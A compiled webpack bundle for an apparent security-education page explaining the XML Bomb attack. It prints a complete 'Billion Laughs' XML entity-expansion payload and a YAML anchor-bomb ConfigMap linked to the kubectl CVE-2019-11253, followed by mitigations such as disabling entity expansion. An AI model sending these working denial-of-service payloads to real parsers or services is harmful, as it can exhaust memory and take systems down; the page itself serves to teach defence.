(window.webpackJsonp=window.webpackJsonp||[]).push([[25],{"5j3C":function(l,e,o){"use strict";o.r(e),o.d(e,"_frontmatter",(function(){return i})),o.d(e,"default",(function(){return r}));o("5hJT"),o("W1QL"),o("K/PF"),o("t91x"),o("75LO"),o("PJhk"),o("mXGw");var t=o("/FXl"),a=o("TjRS");o("aD51");function n(){return(n=Object.assign||function(l){for(var e=1;e<arguments.length;e++){var o=arguments[e];for(var t in o)Object.prototype.hasOwnProperty.call(o,t)&&(l[t]=o[t])}return l}).apply(this,arguments)}var i={};void 0!==i&&i&&i===Object(i)&&Object.isExtensible(i)&&!i.hasOwnProperty("__filemeta")&&Object.defineProperty(i,"__filemeta",{configurable:!0,value:{name:"_frontmatter",filename:"src/attacks_explained/xml_bomb.mdx"}});var c={_frontmatter:i},b=a.a;function r(l){var e=l.components,o=function(l,e){if(null==l)return{};var o,t,a={},n=Object.keys(l);for(t=0;t<n.length;t++)o=n[t],e.indexOf(o)>=0||(a[o]=l[o]);return a}(l,["components"]);return Object(t.b)(b,n({},c,o,{components:e,mdxType:"MDXLayout"}),Object(t.b)("h1",{id:"xml-bomb-attack"},"XML Bomb Attack"),Object(t.b)("h2",{id:"the-attack"},"The Attack"),Object(t.b)("iframe",{width:"100%",height:"450",src:"https://www.youtube.com/embed/WQUiub2hc0c"}),Object(t.b)("h3",{id:"classic-billion-laughs-attack"},'Classic "Billion Laughs" attack'),Object(t.b)("pre",null,Object(t.b)("code",n({parentName:"pre"},{className:"language-xml"}),'<?xml version="1.0"?>\n<!DOCTYPE lolz [\n <!ENTITY lol "lol">\n <!ELEMENT lolz (#PCDATA)>\n <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">\n <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">\n <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">\n <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">\n <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">\n <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">\n <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">\n <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">\n <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">\n]>\n<lolz>&lol9;</lolz>\n')),Object(t.b)("h3",{id:"variations-for-billion-laughs-attack"},'Variations for "Billion Laughs" attack'),Object(t.b)("p",null,"As an example of a YAML configuration file with ",Object(t.b)("a",n({parentName:"p"},{href:"https://github.com/kubernetes/kubernetes/issues/83253"}),"the same vulnerability that affected kubectl (CVE-2019-11253)"),":"),Object(t.b)("pre",null,Object(t.b)("code",n({parentName:"pre"},{className:"language-yml"}),'apiVersion: v1\ndata:\n  a: &a ["web","web","web","web","web","web","web","web","web"]\n  b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]\n  c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]\n  d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]\n  e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]\n  f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]\n  g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]\n  h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]\n  i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]\nkind: ConfigMap\nmetadata:\n  name: yaml-bomb\n  namespace: default\n')),Object(t.b)("h2",{id:"the-solution"},"The solution"),Object(t.b)("p",null,"Use less complex data formats such as JSON."),Object(t.b)("h2",{id:"mitigation"},"Mitigation"),Object(t.b)("p",null,"In case that you must need to use XML..."),Object(t.b)("blockquote",null,Object(t.b)("p",{parentName:"blockquote"},"Be sure to follow the principle of attack surface reduction and disable entity expansion if you don’t require its use. Otherwise, apply appropriate defenses to limit the maximum amount of time and memory your application can spend on it.",Object(t.b)("br",{parentName:"p"}),"\n","Bryan Sullivan")),Object(t.b)("h3",{id:"refs"},"Refs"),Object(t.b)("ul",null,Object(t.b)("li",{parentName:"ul"},Object(t.b)("a",n({parentName:"li"},{href:""}),"Wikipedia | ")),Object(t.b)("li",{parentName:"ul"},Object(t.b)("a",n({parentName:"li"},{href:"https://docs.microsoft.com/en-us/archive/msdn-magazine/2009/november/xml-denial-of-service-attacks-and-defenses"}),"Microsoft | Security Briefs - XML Denial of Service Attacks and Defenses"))))}void 0!==r&&r&&r===Object(r)&&Object.isExtensible(r)&&!r.hasOwnProperty("__filemeta")&&Object.defineProperty(r,"__filemeta",{configurable:!0,value:{name:"MDXContent",filename:"src/attacks_explained/xml_bomb.mdx"}}),r.isMDXComponent=!0}}]);
//# sourceMappingURL=component---src-attacks-explained-xml-bomb-mdx-33c07feb67802efe42e4.js.map